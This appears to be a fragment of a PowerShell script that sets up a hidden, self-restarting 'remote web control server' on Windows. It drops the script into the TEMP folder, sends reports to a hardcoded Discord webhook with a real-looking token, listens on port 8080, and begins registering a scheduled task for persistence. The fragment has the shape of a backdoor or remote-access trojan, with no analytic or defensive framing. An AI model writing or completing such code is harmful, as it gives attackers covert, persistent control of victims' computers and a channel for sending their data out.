...
# Persistence mechanism - restart if closed
$scriptPath = "$env:TEMP\web_remote_persistence.ps1"
$webRemoteScript = @'
# Remote Web Control Server - Persistent Version
$webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
$port = 8080
...
$webRemoteScript | Out-File -FilePath $scriptPath -Encoding UTF8

# Create scheduled task for persistence
$taskName = "WebRemotePersistence"
